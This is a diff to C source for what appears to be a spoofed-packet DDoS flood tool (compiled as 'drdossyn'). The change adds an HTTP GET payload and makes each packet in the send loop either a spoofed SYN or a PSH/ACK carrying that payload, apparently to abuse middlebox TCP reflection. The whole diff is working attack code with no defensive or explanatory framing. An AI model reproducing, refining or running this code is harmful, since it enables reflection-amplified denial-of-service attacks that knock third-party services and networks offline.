@@ -18,10 +18,16 @@
 
 /*gcc -pthread drdCidr.c -o drdossyn -lm*/
 
+static const char middlePayload[] =
+	"GET / HTTP/1.1\r\n"
+	"Host: facebook.com\r\n"
+	"\r\n";
+
 #define MAX_PACKET_SIZE 4096
 #define PHI 0x9e3779b9
 
-static unsigned long int Q[4096], c = 362436;
+static unsigned long int Q[4096],
+	c = 362436;
 static unsigned int floodport;
 volatile int limiter;
 volatile unsigned int pps;
@@ -286,29 +292,50 @@ void *flood(void *par1)
 	int sn_i = 0;
 	while (1)
 	{
-		opts->mssvalue = htons(1360 + (rand_cmwc() % 100));
-		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_node->data, sizeof(list_node->data));
+
 		setup_tcpopts_header(opts);
 		tcph->check = 0;
-		tcph->doff = ((sizeof(struct tcphdr)) + sizeof(struct tcpOptions)) / 4;
+		opts->mssvalue = htons(1360 + (rand_cmwc() % 100));
 		tcph->dest = htons(ports[rand_cmwc() % 2]);
 		iph->saddr = sins[sn_i].sin_addr.s_addr;
 		list_node = list_node->next;
 		iph->daddr = list_node->data.sin_addr.s_addr;
-		iph->id = htonl(rand_cmwc() & 0xFFFF);
-		iph->check = csum((unsigned short *)datagram, iph->tot_len);
 		tcph->seq = htonl(randnum(1000000, 9999999));
 		iph->ttl = randnum(64, 255);
 		tcph->window = htons(windows[rand_cmwc() % 4]);
+		iph->id = htonl(rand_cmwc() & 0xFFFF);
 
-		// printf("Source IP: %s\n", inet_ntoa(*(struct in_addr *)&iph->saddr));
+		int mbox = randnum(0, 1);
+
+		if (mbox == 1)
+		{
+			iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(middlePayload);
+			tcph->doff = 5;
+			tcph->syn = 0;
+			tcph->ack = 1;
+			tcph->psh = 1;
+			memcpy((void *)tcph + sizeof(struct tcphdr), middlePayload, sizeof(middlePayload));
+			iph->check = csum((unsigned short *)datagram, iph->tot_len);
+			tcph->check = tcpcsum(iph, tcph, sizeof(middlePayload));
+			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_node->data, sizeof(list_node->data));
+		}
+		else
+		{
+			iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpOptions);
+			tcph->doff = ((sizeof(struct tcphdr)) + sizeof(struct tcpOptions)) / 4;
+			tcph->syn = 1;
+			tcph->ack = 0;
+			tcph->psh = 0;
+			iph->check = csum((unsigned short *)datagram, iph->tot_len);
+			tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
+			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_node->data, sizeof(list_node->data));
+		}
+
 		if (floodport == 0)
 		{
 			tcph->source = htons(randnum(1, 65535));
 		}
 
-		tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
-		// printf("Source IP: %s\n", inet_ntoa(*(struct in_addr *)&iph->saddr));
 		pps++;
 
 		if (i >= limiter)
